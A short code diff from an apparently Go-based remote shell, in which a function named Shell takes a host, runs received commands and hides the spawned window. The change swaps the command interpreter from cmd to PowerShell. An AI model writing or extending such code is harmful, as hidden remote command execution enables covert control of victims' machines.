@@ -58,7 +58,7 @@ func Shell(host string) {
 			c.Close();
 			os.Exit(0)
 		default:
-			cmd := exec.Command("cmd", "/C", cmd)
+			cmd := exec.Command("powershell", "/C", cmd)
 			//Hide windows
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 			//Read and print output
